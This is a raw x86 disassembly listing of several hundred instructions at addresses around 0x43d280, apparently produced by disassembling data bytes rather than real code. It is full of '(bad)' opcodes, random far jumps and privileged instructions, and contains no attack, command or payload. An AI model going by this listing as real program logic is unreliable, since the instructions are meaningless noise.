  43d280:	jp     0x43d291
  43d282:	in     al,dx
  43d283:	xor    ch,BYTE PTR [ecx-0x10]
  43d286:	ins    BYTE PTR es:[edi],dx
  43d287:	mov    DWORD PTR [eax-0x75fc0e59],ebp
  43d28d:	scas   eax,DWORD PTR es:[edi]
  43d28e:	push   cs
  43d28f:	xor    ecx,0xffffffb8
  43d292:	push   cs
  43d293:	cvtps2pi mm4,QWORD PTR [esi-0x16]
  43d297:	jmp    FWORD PTR [ecx+0x7a7446ad]
  43d29d:	cmp    DWORD PTR [edx-0x75],0xffffffb7
  43d2a1:	mov    ch,0x47
  43d2a3:	cmp    dl,dh
  43d2a5:	es repnz pop ecx
  43d2a8:	addr16 and esp,edi
  43d2ab:	add    DWORD PTR [esi-0x42b86c56],edi
  43d2b1:	lods   eax,DWORD PTR ds:[esi]
  43d2b2:	sahf   
  43d2b3:	mov    ah,0x5f
  43d2b5:	mov    ah,0xe
  43d2b7:	lea    eax,[eax]
  43d2b9:	add    BYTE PTR [eax],al
  43d2bb:	add    BYTE PTR [eax],al
  43d2bd:	pop    ebp
  43d2be:	mov    edx,0xa63afa6b
  43d2c3:	pop    ebp
  43d2c4:	mov    ebx,DWORD PTR [esi+0x415f9392]
  43d2ca:	scas   eax,DWORD PTR es:[edi]
  43d2cb:	push   esi
  43d2cc:	pop    eax
  43d2cd:	xchg   edx,eax
  43d2ce:	or     al,0x17
  43d2d0:	mov    dh,0x3d
  43d2d2:	(bad)  
  43d2d3:	xchg   ecx,eax
  43d2d4:	inc    edi
  43d2d5:	popa   
  43d2d6:	add    eax,0xefbf0fca
  43d2db:	sbb    eax,DWORD PTR [ecx]
  43d2dd:	cmp    dh,ch
  43d2df:	or     al,BYTE PTR [edi-0x53]
  43d2e2:	stos   DWORD PTR es:[edi],eax
  43d2e3:	dec    esi
  43d2e4:	dec    eax
  43d2e5:	ins    BYTE PTR es:[edi],dx
  43d2e6:	sub    DWORD PTR [esi+0x50],ebx
  43d2e9:	jb     0x43d295
  43d2eb:	push   esi
  43d2ec:	mov    edx,DWORD PTR [esi-0x4eb86c82]
  43d2f2:	mov    cl,0x9c
  43d2f4:	inc    esp
  43d2f5:	jmp    0x90a366af
  43d2fa:	pop    ecx
  43d2fb:	ret    
  43d2fc:	loope  0x43d309
  43d2fe:	push   ecx
  43d2ff:	push   edx
  43d300:	sub    eax,0x5457bcd6
  43d305:	sbb    ebp,DWORD PTR [ecx+0x22]
  43d308:	xchg   DWORD PTR [edi+0x51],edx
  43d30b:	js     0x43d292
  43d30d:	mov    WORD PTR [edx+0x33],ds
  43d310:	out    dx,al
  43d311:	mov    ss:0x611b6d11,al
  43d317:	test   DWORD PTR es:[edi+0x5d],edx
  43d31b:	js     0x43d2a4
  43d31d:	jl     0x43d370
  43d31f:	fisttp WORD PTR [eax+0x0]
  43d325:	add    BYTE PTR [edi+ecx*1+0xe],al
  43d329:	add    BYTE PTR [ebx],bl
  43d32b:	cwde   
  43d32c:	mov    eax,ds:0x6b199011
  43d331:	dec    eax
  43d332:	cld    
  43d333:	sbb    al,0xa6
  43d335:	cmp    eax,0x6e0e1213
  43d33a:	mov    WORD PTR [esi-0x65df8d2e],ss
  43d340:	jns    0x43d3b6
  43d342:	mov    ds,WORD PTR [edx]
  43d344:	push   cs
  43d345:	add    bl,al
  43d347:	and    eax,0x73131065
  43d34c:	push   ss
  43d34d:	add    BYTE PTR [edi+0x37f9a59e],cl
  43d353:	pusha  
  43d354:	data16 adc BYTE PTR [eax+0x2f],0xe
  43d359:	add    BYTE PTR [ebx],bl
  43d35b:	loopne 0x43d37b
  43d35d:	xor    eax,0x8571cc51
  43d362:	lahf   
  43d363:	lds    ecx,FWORD PTR ds:0xd3f47c71
  43d369:	ins    BYTE PTR es:[edi],dx
  43d36a:	mov    dh,0x4
  43d36c:	lods   al,BYTE PTR ds:[esi]
  43d36d:	test   cl,bl
  43d36f:	cdq    
  43d370:	cmc    
  43d371:	std    
  43d372:	nop
  43d373:	sbb    DWORD PTR [esi],ecx
  43d375:	jb     0x43d30c
  43d377:	mov    dl,0xac
  43d379:	add    ah,bh
  43d37b:	cs clc 
  43d37d:	jp     0x43d3cf
  43d37f:	jmp    0x674f:0x8244c5f4
  43d386:	xor    eax,0x82f7b2
  43d38b:	add    BYTE PTR [eax],al
  43d38d:	add    BYTE PTR [eax],al
  43d38f:	sar    DWORD PTR [ecx+0x3959cdf4],cl
  43d395:	inc    ecx
  43d396:	les    esp,FWORD PTR [ecx+0x154af7b2]
  43d39c:	adc    eax,0x481ac2d3
  43d3a1:	test   BYTE PTR [eax+edx*4],0xb2
  43d3a5:	mov    esp,0xccd524c1
  43d3aa:	repz push cs
  43d3ac:	cmc    
  43d3ad:	cmc    
  43d3ae:	add    al,0x90
  43d3b0:	mov    dl,0xbc
  43d3b2:	mov    ebx,0x16a23c4
  43d3b7:	or     eax,0xa83f6d24
  43d3bc:	mov    cl,0x9f
  43d3be:	push   ebp
  43d3bf:	xlat   BYTE PTR ds:[ebx]
  43d3c0:	sbb    cl,BYTE PTR [eax]
  43d3c2:	pop    ebx
  43d3c3:	nop
  43d3c4:	mov    dl,0x74
  43d3c6:	(bad)  
  43d3c7:	(bad)  
  43d3c8:	mov    bl,0x80
  43d3ca:	ret    
  43d3cb:	mov    eax,ds:0xdd4df7b2
  43d3d0:	cmp    ebx,edx
  43d3d2:	push   eax
  43d3d3:	std    
  43d3d4:	dec    BYTE PTR [edx]
  43d3d6:	jnp    0x43d403
  43d3d8:	test   BYTE PTR [ecx],al
  43d3da:	jnp    0x43d37e
  43d3dc:	mov    edx,0x3194455c
  43d3e1:	mov    eax,0x3af5c0ea
  43d3e6:	lock sbb BYTE PTR [esi],ch
  43d3e9:	clc    
  43d3ea:	add    ecx,ebx
  43d3ec:	sub    eax,0xa1900391
  43d3f1:	hlt    
  43d3f2:	jl     0x43d3f4
  43d3f4:	add    BYTE PTR [eax],al
  43d3f6:	add    BYTE PTR [eax],al
  43d3f8:	push   edx
  43d3f9:	punpckldq mm1,DWORD PTR cs:[ebp-0x5a]
  43d3fe:	lea    esi,[ecx-0x6c]
  43d401:	mov    ds:0x15f571fc,eax
  43d406:	add    BYTE PTR [edi-0x12],bl
  43d409:	sub    dl,BYTE PTR [esi-0x30cea051]
  43d40f:	ficom  WORD PTR [edi]
  43d411:	push   esi
  43d412:	psubsw mm2,QWORD PTR [ebx+0x3acd542d]
  43d419:	jnp    0x43d465
  43d41b:	bound  ecx,QWORD PTR [eax+0x2e]
  43d41e:	xchg   esi,eax
  43d41f:	xchg   edi,eax
  43d420:	dec    edi
  43d421:	repz push eax
  43d423:	popf   
  43d424:	xchg   ebx,eax
  43d425:	mov    dl,0xe
  43d427:	jmp    0x9d53863c
  43d42c:	(bad)  
  43d42d:	out    0xbe,eax
  43d42f:	fwait
  43d430:	mov    esp,0xdd70bed7
  43d435:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43d436:	xchg   edi,eax
  43d437:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43d438:	fbstp  TBYTE PTR [ecx]
  43d43a:	fdiv   DWORD PTR [ecx-0x72]
  43d43d:	aaa    
  43d43e:	inc    ecx
  43d43f:	mov    cl,0x92
  43d441:	std    
  43d442:	cmc    
  43d443:	jmp    0x43d3e5
  43d445:	cld    
  43d446:	je     0x43d431
  43d448:	js     0x43d4b7
  43d44a:	aas    
  43d44b:	cmp    edi,DWORD PTR [esi-0x6bb5d7e6]
  43d451:	mov    dl,0x95
  43d453:	aaa    
  43d454:	mov    al,0x37
  43d456:	sub    DWORD PTR [edx+0x48],ebp
  43d459:	mov    ebp,0x2797
  43d45e:	add    BYTE PTR [eax],al
  43d460:	add    al,ah
  43d462:	sbb    bl,BYTE PTR [eax-0x69d5c24e]
  43d468:	call   DWORD PTR [eax]
  43d46a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43d46b:	(bad)  
  43d46c:	call   0x27d94c18
  43d471:	shl    BYTE PTR [edi],0x41
  43d474:	std    
  43d475:	mov    BYTE PTR [ebx+0x3a],dh
  43d478:	add    dl,ah
  43d47a:	push   DWORD PTR [esi+eax*1]
  43d47d:	call   0x197ee332
  43d482:	das    
  43d483:	ins    BYTE PTR es:[edi],dx
  43d484:	jns    0x43d504
  43d486:	pop    ds
  43d487:	out    0x85,eax
  43d489:	mov    al,ds:0x378b0f9e
  43d48e:	fldpi  
  43d490:	rcl    BYTE PTR [edx-0x50],0x3b
  43d494:	rcl    bl,0xb0
  43d497:	pop    eax
  43d498:	push   eax
  43d499:	daa    
  43d49a:	or     esp,edi
  43d49c:	bound  ebp,QWORD PTR [ecx-0x32b16c50]
  43d4a2:	test   eax,0xc6758327
  43d4a7:	xchg   ecx,eax
  43d4a8:	dec    esi
  43d4a9:	int    0x8
  43d4ab:	sub    al,0xfb
  43d4ad:	jle    0x43d4ce
  43d4af:	xchg   ebx,eax
  43d4b0:	push   ss
  43d4b1:	sub    bl,BYTE PTR [eax+0x356efffe]
  43d4b7:	push   eax
  43d4b8:	dec    DWORD PTR [esi-0x56ccb8e3]
  43d4be:	jl     0x43d453
  43d4c0:	in     eax,0x1c
  43d4c2:	repz xchg edx,eax
  43d4c4:	inc    ebp
  43d4c5:	add    BYTE PTR [eax],al
  43d4c7:	add    BYTE PTR [eax],al
  43d4c9:	add    BYTE PTR [ebp+0x35],cl
  43d4cc:	stos   BYTE PTR es:[edi],al
  43d4cd:	je     0x43d517
  43d4cf:	test   DWORD PTR [edi+0xeb067b4],0xeb06900
  43d4d9:	and    DWORD PTR [ecx-0x4c],0x5d
  43d4dd:	inc    edx
  43d4de:	ret    0x4aed
  43d4e1:	test   DWORD PTR [eax],eax
  43d4e3:	cwde   
  43d4e4:	jnp    0xc12fb351
  43d4ea:	push   edx
  43d4eb:	mov    dl,0x3b
  43d4ed:	shl    BYTE PTR [edx+0x286a7a85],0xcb
  43d4f4:	fst    DWORD PTR [edx-0x70]
  43d4f7:	jmp    0xb86dbd3c
  43d4fc:	adc    al,BYTE PTR [eax]
  43d4fe:	sbb    ebx,esp
  43d500:	outs   dx,BYTE PTR ds:[esi]
  43d501:	test   DWORD PTR [esi+0x90fd198],edi
  43d507:	fdivr  QWORD PTR [esi]
  43d509:	call   0xf93e7507
  43d50e:	sbb    esp,DWORD PTR [edi+ebx*1]
  43d511:	rcr    BYTE PTR [ecx-0x78a701a6],0xae
  43d518:	int    0x59
  43d51a:	adc    ebx,edx
  43d51c:	jne    0x85132bcf
  43d522:	push   esi
  43d523:	std    
  43d524:	push   cx
  43d526:	push   esp
  43d527:	and    al,dl
  43d529:	jns    0x43d590
  43d52b:	xchg   esi,eax
  43d52c:	mov    edi,0x77
  43d531:	add    BYTE PTR [eax],al
  43d533:	(bad)  
  43d534:	mov    al,ds:0xdf93382b
  43d539:	(bad)  
  43d53a:	std    
  43d53b:	(bad)
  43d540:	xlat   BYTE PTR ds:[ebx]
  43d541:	cmp    eax,0x3ec1de4f
  43d546:	pop    esi
  43d547:	nop
  43d548:	sbb    DWORD PTR [edi+0x51],esp
  43d54b:	in     al,0x90
  43d54d:	cmp    edi,DWORD PTR [ebp+0x54]
  43d550:	or     DWORD PTR [ebp+0x51],esp
  43d553:	les    eax,FWORD PTR [ecx]
  43d555:	mov    dl,0xf5
  43d557:	pop    edi
  43d558:	or     al,0x6a
  43d55a:	add    DWORD PTR [ebx],edx
  43d55c:	add    DWORD PTR [edx],0x73959f00
  43d562:	stc    
  43d563:	inc    edi
  43d564:	hlt    
  43d565:	push   ebp
  43d566:	mov    eax,0xe1991
  43d56b:	(bad)  
  43d56c:	nop
  43d56d:	out    dx,eax
  43d56e:	pop    edx
  43d56f:	push   ebx
  43d570:	dec    ebp
  43d571:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43d572:	retf   
  43d573:	push   esp
  43d574:	mov    dl,0xa3
  43d576:	mov    eax,0xb8bbfe4b
  43d57b:	dec    ebx
  43d57c:	(bad)  
  43d57d:	sub    bh,BYTE PTR [edi-0x5]
  43d580:	jle    0x43d5a3
  43d582:	jg     0x43d506
  43d584:	mov    edx,0x2afeaf08
  43d589:	clc    
  43d58a:	add    ecx,DWORD PTR ds:0x64426d2b
  43d590:	in     eax,dx
  43d591:	icebp  
  43d592:	add    al,0x90
  43d594:	mov    dl,0xc4
  43d596:	add    BYTE PTR es:[eax],al
  43d599:	add    BYTE PTR [eax],al
  43d59b:	add    BYTE PTR ds:0xdb7b402c,dl
  43d5a1:	sub    al,BYTE PTR [ecx+0x7f]
  43d5a4:	push   ecx
  43d5a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43d5a6:	sbb    al,BYTE PTR [edx]
  43d5a8:	(bad)  
  43d5a9:	sub    bh,al
  43d5ab:	jbe    0x43d543
  43d5ad:	das    
  43d5ae:	stos   DWORD PTR es:[edi],eax
  43d5af:	div    DWORD PTR [edi-0x51c38445]
  43d5b5:	sub    bh,al
  43d5b7:	and    bh,0xba
  43d5ba:	jnp    0x43d5ff
  43d5bc:	sahf   
  43d5bd:	sub    bh,al
  43d5bf:	xchg   BYTE PTR [edi+0x155785ae],bl
  43d5c5:	jno    0x43d576
  43d5c7:	jle    0x43d5a2
  43d5c9:	mov    bl,BYTE PTR [edx+edx*2-0x14]
  43d5cd:	cmp    eax,0x13452f6a
  43d5d2:	ins    DWORD PTR es:[edi],dx
  43d5d3:	cmp    ch,BYTE PTR [eax-0x68c7de47]
  43d5d9:	mov    ah,0x4
  43d5db:	lds    edi,FWORD PTR [eax+esi*2+0x23]
  43d5df:	jg     0x43d5aa
  43d5e1:	outs   dx,BYTE PTR ds:[esi]
  43d5e2:	adc    al,0xee
  43d5e4:	adc    al,0x81
  43d5e6:	aaa    
  43d5e7:	jge    0x43d5ba
  43d5e9:	jp     0x43d644
  43d5eb:	jg     0x43d580
  43d5ed:	jae    0x43d640
  43d5ef:	jge    0x43d584
  43d5f1:	lods   al,BYTE PTR ds:[esi]
  43d5f2:	push   cs
  43d5f3:	bound  ebp,QWORD PTR [ecx-0x6a]
  43d5f6:	sub    eax,0x412f601f
  43d5fb:	sub    DWORD PTR [ebx],ebx
  43d5fd:	arpl   WORD PTR [ebx],dx
  43d5ff:	xor    eax,DWORD PTR [eax]
  43d601:	add    BYTE PTR [eax],al
  43d603:	add    BYTE PTR [eax],al
  43d605:	xchg   edi,eax
  43d606:	jnp    0x43d65e
  43d608:	bound  esp,QWORD PTR [ecx+0x6e]
  43d60b:	jo     0x43d66f
  43d60d:	jns    0x43d5a5
  43d60f:	jo     0x43d681
  43d611:	mov    bh,0x70
  43d613:	xchg   ebx,eax
  43d614:	test   eax,0x2795cb67
  43d619:	dec    eax
  43d61a:	das    
  43d61b:	inc    ecx
  43d61c:	mov    ebp,0x538ffa86
  43d621:	xchg   ecx,eax
  43d622:	sub    edx,ebp
  43d624:	jmp    0xe4a5c6cf
  43d629:	arpl   WORD PTR [esi+esi*8+0xeb264e1],ax
  43d630:	push   0xffffffff
  43d632:	mov    cl,0x97
  43d634:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43d635:	xor    esp,DWORD PTR [edi-0x44693698]
  43d63b:	mov    WORD PTR [ecx*4+0x1e8f0eb2],es
  43d642:	jnp    0x43d6be
  43d644:	xchg   DWORD PTR [esi+0x7c],esi
  43d647:	pop    esi
  43d648:	bound  esp,QWORD PTR [ecx]
  43d64a:	dec    ecx
  43d64b:	add    ecx,ebp
  43d64d:	xchg   ebx,eax
  43d64e:	xor    BYTE PTR [ecx-0x77],dl
  43d651:	(bad)  
  43d652:	imul   esi,DWORD PTR [ebx+0x19b293d7],0x3e
  43d659:	sub    al,0x93
  43d65b:	xchg   edi,eax
  43d65c:	ffree  st(2)
  43d65e:	das    
  43d65f:	add    DWORD PTR [ecx+0x720eb282],0xe901492a
  43d669:	add    BYTE PTR [eax],al
  43d66b:	add    BYTE PTR [eax],al
  43d66d:	add    BYTE PTR [ebx-0x6f9ef22a],dl
  43d673:	loopne 0x43d684
  43d675:	add    BYTE PTR [edi+0x2900004e],dh
  43d67b:	sub    ah,BYTE PTR [eax-0x659cc940]
  43d681:	and    BYTE PTR [edx+0x28660e6e],dl
  43d687:	xor    DWORD PTR [eax+0xeb52d98],eax
  43d68d:	lea    edi,[ebp+0x44]
  43d690:	add    BYTE PTR [ecx+edi*8],0xb4
  43d694:	imul   eax,ecx,0xffea1b16
  43d69a:	push   ecx
  43d69b:	scas   al,BYTE PTR es:[edi]
  43d69c:	jmp    0x23d6d0a0
  43d6a1:	enter  0x20ea,0x17
  43d6a5:	mov    bh,0xa0
  43d6a7:	sub    esp,DWORD PTR [eax+0x4ecd8981]
  43d6ad:	add    BYTE PTR [edx+0x21],dl
  43d6b0:	pop    ss
  43d6b1:	mov    bh,0x88
  43d6b3:	cmc    
  43d6b4:	repz pop es
  43d6b6:	(bad)  
  43d6b7:	bound  ebp,QWORD PTR [eax+eiz*1-0x5d]
  43d6bb:	outs   dx,BYTE PTR ds:[esi]
  43d6bc:	push   cs
  43d6bd:	mov    ax,0x9030
  43d6c1:	mov    BYTE PTR [eax+0x2f8b0eb4],dh
  43d6c7:	cmp    al,BYTE PTR [eax]
  43d6c9:	add    BYTE PTR [ecx-0x45d42e23],ch
  43d6cf:	fisttp DWORD PTR [eax+eiz*4+0x0]
  43d6d6:	add    BYTE PTR [edi-0x4c],bh
  43d6d9:	push   cs
  43d6da:	mov    ebp,DWORD PTR [edi]
  43d6dc:	xchg   esp,eax
  43d6dd:	pop    ss
  43d6de:	xchg   esp,eax
  43d6df:	test   al,0xcb
  43d6e1:	dec    esp
  43d6e2:	je     0x43d6d6
  43d6e4:	sbb    edx,DWORD PTR [ebx-0x732922b2]
  43d6ea:	sub    BYTE PTR [ecx-0x4c],0xe
  43d6ee:	ja     0x43d68e
  43d6f0:	sub    eax,0x8b9003e1
  43d6f5:	inc    eax
  43d6f6:	dec    eax
  43d6f7:	sbb    eax,edx
  43d6f9:	jb     0x43d6fa
  43d6fb:	fnstsw WORD PTR [ebp+0x6b]
  43d6fe:	push   ecx
  43d6ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43d700:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43d701:	push   edi
  43d702:	dec    eax
  43d703:	sbb    edx,eax
  43d705:	pop    edx
  43d706:	test   esi,ecx
  43d708:	and    edi,esp
  43d70a:	mov    cl,0xd4
  43d70c:	sbb    edx,DWORD PTR [ecx*8+0x4427a533]
  43d713:	ret    
  43d714:	pop    esp
  43d715:	xor    eax,DWORD PTR [edx+0x5c]
  43d718:	xchg   esp,eax
  43d719:	push   edi
  43d71a:	xor    al,0x9
  43d71c:	fsubr  DWORD PTR [edx]
  43d71e:	or     DWORD PTR [edi],edi
  43d720:	push   cs
  43d721:	dec    ebp
  43d722:	sbb    eax,0x403f94ca
  43d727:	outs   dx,BYTE PTR ds:[esi]
  43d728:	xchg   edx,eax
  43d729:	jmp    0x508c6683
  43d72e:	ins    BYTE PTR es:[edi],dx
  43d72f:	or     ebx,DWORD PTR [eax+0x26]
  43d732:	test   DWORD PTR [esi+0x55],esp
  43d735:	jo     0x43d6be
  43d737:	mov    WORD PTR [ebx-0x9],ss
  43d73a:	dec    ecx
  43d73b:	add    BYTE PTR [eax],al
  43d73d:	add    BYTE PTR [eax],al
  43d73f:	add    BYTE PTR [eax],dh
  43d741:	xor    al,0xd
  43d743:	add    BYTE PTR [eax-0x464e86e7],dl
  43d749:	pushf  
  43d74a:	or     eax,0x501a9000
  43d74f:	ins    BYTE PTR es:[edi],dx
  43d750:	or     ebp,DWORD PTR [eax+0x36]
  43d753:	std    
  43d754:	cmp    eax,0xe8496b35
  43d759:	fmul   DWORD PTR [edi+0x60]
  43d75c:	nop
  43d75d:	sbb    DWORD PTR [esi],ecx
  43d75f:	add    BYTE PTR [edi-0x3178ec19],cl
  43d765:	popa   
  43d766:	ret    
  43d767:	fistp  WORD PTR [edi-0x5d00d419]
  43d76d:	fidiv  DWORD PTR [edx]
  43d76f:	inc    edx
  43d770:	les    esi,FWORD PTR [edx+0x1bc83e5e]
  43d776:	sub    edi,DWORD PTR [ebx-0x1f]
  43d779:	xchg   esi,eax
  43d77a:	ins    BYTE PTR es:[edi],dx
  43d77b:	mov    BYTE PTR ds:[esp+esi*8],bh
  43d77f:	add    DWORD PTR ds:0x900e9838,edx
  43d785:	mov    dl,0x5c
  43d787:	mov    ?,ebx
  43d789:	mov    edi,0x277503f7
  43d78e:	push   edx
  43d78f:	jge    0x43d7ec
  43d791:	jl     0x43d7ef
  43d793:	mov    ?,edi
  43d795:	mov    edi,0x381503f7
  43d79a:	pusha  
  43d79b:	push   cs
  43d79c:	nop
  43d79d:	mov    dl,0x6f
  43d79f:	add    BYTE PTR [edi+0xa471b1],cl
  43d7a5:	add    BYTE PTR [eax],al
  43d7a7:	add    BYTE PTR [eax],al
  43d7a9:	mov    eax,ds:0x21f6f7b2
  43d7ae:	repnz sbb DWORD PTR ds:0x4443004,eax
  43d7b5:	nop
  43d7b6:	mov    dl,0x5c
  43d7b8:	jbe    0x43d7b5
  43d7ba:	mov    edi,0x2e1b03f7
  43d7bf:	jp     0x43d751
  43d7c1:	(bad)  
  43d7c2:	es clc 
  43d7c4:	xor    cl,dh
  43d7c6:	ficomp DWORD PTR [ebp*1+0x3c2520a]
  43d7cd:	nop
  43d7ce:	mov    bh,0x4b
  43d7d0:	ret    0x77a8
  43d7d3:	mov    ds:0xd1b0a57a,eax
  43d7d8:	push   edi
  43d7d9:	adc    esp,DWORD PTR [edi]
  43d7db:	stc    
  43d7dc:	jg     0x43d837
  43d7de:	sub    BYTE PTR [ecx],al
  43d7e0:	out    0xc,eax
  43d7e2:	jne    0x43d79f
  43d7e4:	adc    BYTE PTR [esi-0x55],0xf8
  43d7e8:	jp     0x43d7bb
  43d7ea:	jmp    0xba0e:0xb174c4f4
  43d7f1:	push   ebx
  43d7f2:	das    
  43d7f3:	inc    ecx
  43d7f4:	jge    0x43d7af
  43d7f6:	mov    dl,0x35
  43d7f8:	mov    eax,0xd14082c1
  43d7fd:	test   BYTE PTR [edx+0x73cae90e],0x7a
  43d804:	bound  esi,QWORD PTR [ebp-0x59]
  43d807:	rcr    cl,cl
  43d809:	mov    ah,0x73
  43d80b:	dec    edx
  43d80c:	rol    DWORD PTR [eax],1
  43d80e:	add    BYTE PTR [eax],al
  43d810:	add    BYTE PTR [eax],al
  43d812:	es push ds
  43d814:	jmp    0x8430:0x8dbbaab6
  43d81b:	mov    dl,0x19
  43d81d:	ins    BYTE PTR es:[edi],dx
  43d81e:	add    ch,BYTE PTR [ecx]
  43d820:	jmp    0x5aa9:0x1d88569e
  43d827:	mov    ebp,ecx
  43d829:	bound  edi,QWORD PTR [ebp+0x12b19596]
  43d82f:	push   ds
  43d830:	or     eax,0xd5d90fb
  43d835:	jmp    0xecd18acd
  43d83a:	out    0xb1,eax
  43d83c:	xchg   edi,eax
  43d83d:	ja     0x43d866
  43d83f:	les    ecx,FWORD PTR [esi]
  43d841:	jmp    0xbfd9c186
  43d846:	dec    edi
  43d847:	xor    DWORD PTR [ebp+0x592ebed1],edi
  43d84d:	add    DWORD PTR [ebx+0x62ebf5ec],edx
  43d853:	in     eax,dx
  43d854:	cmp    eax,0x3f75d202
  43d859:	xchg   edi,eax
  43d85a:	mov    ebx,0x93e94993
  43d85f:	das    
  43d860:	inc    ecx
  43d861:	lea    ecx,[edx]
  43d863:	in     al,dx
  43d864:	lea    ebp,ds:0xad412da3
  43d86a:	pop    ebx
  43d86b:	arpl   dx,sp
  43d86d:	add    BYTE PTR [esi+0x2a06930c],cl
  43d873:	and    WORD PTR [eax+0x0],cx
  43d877:	add    BYTE PTR [eax],al
  43d879:	add    BYTE PTR [eax],al
  43d87b:	dec    ecx
  43d87c:	ins    BYTE PTR es:[edi],dx
  43d87d:	pop    ss
  43d87e:	xchg   ebp,eax
  43d87f:	test   al,0x6f
  43d881:	inc    ebx
  43d882:	lea    ebp,[eax-0x453cba50]
  43d888:	dec    esp
  43d889:	mov    dl,BYTE PTR [esi]
  43d88b:	cmp    DWORD PTR [ecx-0x545e8bf2],esi
  43d891:	aas    
  43d892:	pop    esp
  43d893:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43d894:	add    BYTE PTR [edx+0x7],ah
  43d897:	mov    ds:0xf30326dc,al
  43d89c:	or     ch,ah
  43d89e:	xor    dh,al
  43d8a0:	xchg   DWORD PTR [esi],ecx
  43d8a2:	sub    ebp,ebx
  43d8a4:	jge    0x43d8ff
  43d8a6:	push   esi
  43d8a7:	and    DWORD PTR [edi-0x5606ffb9],ebp
  43d8ad:	aas    
  43d8ae:	ins    BYTE PTR es:[edi],dx
  43d8af:	jb     0x43d87d
  43d8b1:	imul   eax,esp,0xffffffd9
  43d8b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43d8b5:	aas    
  43d8b6:	pop    esp
  43d8b7:	add    DWORD PTR [edi-0x21],edi
  43d8ba:	call   FWORD PTR [esi-0x55]
  43d8bd:	jae    0xf5299a4
  43d8c3:	gs mov fs,edi
  43d8c6:	jmp    FWORD PTR [esi+0x6f]
  43d8c9:	inc    esp
  43d8ca:	mov    edi,DWORD PTR [edx+0x7b]
  43d8cd:	inc    ebp
  43d8ce:	ret    
  43d8cf:	popf   
  43d8d0:	push   0xffffffd6
  43d8d2:	int3   
  43d8d3:	jge    0x43d93f
  43d8d5:	(bad)  
  43d8d6:	int3   
  43d8d7:	jge    0x43d943
  43d8d9:	(bad)  
  43d8da:	int3   
  43d8db:	add    al,0xaa
  43d8dd:	cmc    
  43d8de:	push   ebx
  43d8df:	add    BYTE PTR [eax],al
  43d8e1:	add    BYTE PTR [eax],al
  43d8e3:	add    BYTE PTR [edi],al
  43d8e5:	stos   BYTE PTR es:[edi],al
  43d8e6:	pop    esp
  43d8e7:	or     dh,dl
  43d8e9:	pop    ecx
  43d8ea:	jmp    0x93f452ee
  43d8ef:	call   DWORD PTR [eax+0x11742090]
  43d8f5:	ret    
  43d8f6:	call   0x5f5e50f9
  43d8fb:	and    al,0x1b
  43d8fd:	and    al,0xc6
  43d8ff:	pop    ecx
  43d900:	imul   ebx,DWORD PTR ds:0x9dce84f3,0x1a8ef68c
  43d90a:	push   cs
  43d90b:	add    bl,al
  43d90d:	pop    ds
  43d90e:	(bad)  
  43d90f:	jp     0x43d8a5
  43d911:	sbb    ebx,esp
  43d913:	sub    DWORD PTR [edi+edx*1+0xe],0x0
  43d918:	or     eax,0x4683e363
  43d91d:	sbb    BYTE PTR [esi],cl
  43d91f:	add    BYTE PTR [ebx+0x59],ah
  43d922:	(bad)  
  43d923:	not    BYTE PTR [ebx-0x317ada19]
  43d929:	loope  0x43d992
  43d92b:	dec    ecx
  43d92c:	push   0x1b6c5ba0
  43d931:	mov    esp,0x90f0cd1e
  43d936:	and    edi,DWORD PTR [eax]
  43d938:	xchg   ebx,esp
  43d93a:	and    DWORD PTR [edi],ecx
  43d93c:	xchg   edx,eax
  43d93d:	push   0xc54e1ccd
  43d942:	addr16 dec ecx
  43d944:	push   esp
  43d945:	clc    
  43d946:	test   DWORD PTR [eax+eax*1+0x0],0x4165593e
  43d951:	pop    eax
  43d952:	jmp    0x43d9ba
  43d954:	add    edx,DWORD PTR [ecx-0xd]
  43d957:	add    edi,DWORD PTR fs:[edx]
  43d95a:	nop
  43d95b:	and    ebp,DWORD PTR [ebx+esi*2+0x5b]
  43d95f:	cmp    al,BYTE PTR [ebp-0x4f1ca6ba]
  43d965:	mov    WORD PTR [edi+0x67],cs
  43d968:	dec    ecx
  43d969:	dec    eax
  43d96a:	nop
  43d96b:	pop    ebx
  43d96c:	inc    esp
  43d96d:	cs mov dl,0x5c
  43d970:	gs cld 
  43d972:	mov    WORD PTR [esi+0x27],ds
  43d975:	into   
  43d976:	aaa    
  43d977:	mov    dl,0x63
  43d979:	adc    eax,0x75a4877c
  43d97e:	and    edi,eax
  43d980:	add    edx,DWORD PTR [edi]
  43d982:	je     0x43d913
  43d984:	jp     0x43d947
  43d986:	mov    gs,WORD PTR [esi+0x65]
  43d989:	lock sub eax,0xe7ce6f38
  43d98f:	popa   
  43d990:	test   BYTE PTR [edi+0x23],cl
  43d993:	clc    
  43d994:	push   esi
  43d995:	xchg   BYTE PTR [edi],dh
  43d997:	sub    dh,BYTE PTR [eax+0x15]
  43d99a:	je     0x43d987
  43d99c:	cs pusha 
  43d99e:	xor    DWORD PTR [edi-0x7dcd0f6],edi
  43d9a4:	push   ds
  43d9a5:	push   edi
  43d9a6:	fwait
  43d9a7:	out    0x33,eax
  43d9a9:	ret    0x601a
  43d9ac:	imul   edx,DWORD PTR [eax+0xc874b2],0x0
  43d9b6:	xchg   edi,eax
  43d9b7:	cmp    DWORD PTR [edx],esi
  43d9b9:	test   DWORD PTR fs:[edx],ebp
  43d9bc:	sti    
  43d9bd:	pop    edx
  43d9be:	call   0xf822:0xf78c79e9
  43d9c5:	push   edi
  43d9c6:	popf   
  43d9c7:	das    
  43d9c8:	nop
  43d9c9:	pop    es
  43d9ca:	arpl   cx,ax
  43d9cc:	ins    BYTE PTR es:[edi],dx
  43d9cd:	cmp    ch,BYTE PTR [edi+edx*8+0x1]
  43d9d1:	push   esp
  43d9d2:	push   edi
  43d9d3:	sub    al,bh
  43d9d5:	repz iret 
  43d9d7:	and    al,dl
  43d9d9:	push   es
  43d9da:	shld   edi,edx,0x8e
  43d9de:	push   ecx
  43d9df:	stos   BYTE PTR es:[edi],al
  43d9e0:	je     0x43d9be
  43d9e2:	mov    ah,0xb3
  43d9e4:	jne    0x43da57
